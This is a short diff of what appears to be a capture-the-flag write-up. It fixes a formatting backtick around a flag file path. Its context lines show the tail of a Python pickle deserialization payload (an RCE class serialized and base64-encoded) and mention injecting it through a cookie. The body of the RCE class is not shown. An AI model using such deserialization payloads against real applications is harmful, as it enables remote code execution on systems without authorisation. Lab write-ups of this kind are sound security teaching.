@@ -199,7 +199,7 @@ payload = pickle.dumps(RCE())
 print(base64.b64encode(payload).decode())
 ```
 
-I repeated the injection process with the new cookie then navigated to `/static/flag.txt 
+I repeated the injection process with the new cookie then navigated to `/static/flag.txt` 
 
 
 ## 4. The Solution
